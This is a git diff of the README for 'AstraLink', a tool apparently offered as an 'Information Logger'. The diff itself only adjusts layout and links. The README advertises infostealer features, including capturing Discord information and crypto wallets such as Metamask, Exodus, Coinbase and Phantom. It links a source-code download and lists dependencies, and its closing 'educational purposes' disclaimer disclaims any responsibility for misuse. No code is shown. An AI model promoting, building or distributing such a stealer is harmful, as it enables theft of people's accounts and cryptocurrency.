@@ -1,17 +1,17 @@
 # Guide and Info's about AstraLink!
 <h1 align="center"> Astra Link Information Logger  </h1> 
-<p align= "center"> <kbd> <img  src=""width="420"> </kbd><br><br>
+<p align= "center"> <kbd> https://imgur.com/pL3eguv <img  src=""width="420"> </kbd><br><br>
 
 
 
 
 
 
-<p align="center"><a href="https://about.me/metaversenova" target="_blank">Click here if you want to reach out to me by any social media platform or general platforms you'd like </a>
+<p align="center"><a href="https://about.me/metaversenova" target="_blank"> Reach out to me here!
 
 
 
-                                                      ⬇ Logging Features ⬇
+                                     ⬇ Logging Features ⬇
 
 
 -   Discord Information 
@@ -109,7 +109,7 @@
 - Logs Crypto Wallets: Metamask, Atomic, Exodus, Binance, Coinbase, Trust and Phantom 
 
 
-                                                        ⬇ Instructions ⬇
+                                 ⬇ Instructions ⬇
 
 
 1. [Download source code zip](https://github.com/metaversnova/AstraLink/archive/refs/heads/main.zip)
@@ -123,7 +123,7 @@
 <div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="></img></div>
 
 
-                                                       ⬇ Dependencies ⬇
+                                 ⬇ Dependencies ⬇
  
 -   [Python](https://www.python.org/downloads/release/python-3109/)
 -   [Git](https://git-scm.com/download/win)
@@ -133,7 +133,7 @@
 </div>
  
  
-                                               ⬇ Issues? Volunteer Contributor? ⬇
+                          ⬇ Issues? Volunteer Contributor? ⬇
 
 
 * View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
@@ -141,13 +141,7 @@
 * Reach out to me at any linked platform on https://about.me/metaversenova
 
 
-
-
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="></img>
-
-
-
-                                             ⬇ Educational Purposes Disclosure ⬇
+                              ⬇ Educational Purposes Disclosure ⬇
 
 
 - <bold> This tool is a tool that should be used only for educational purposes. I do not hold any responsibility for any misuse! </bold>
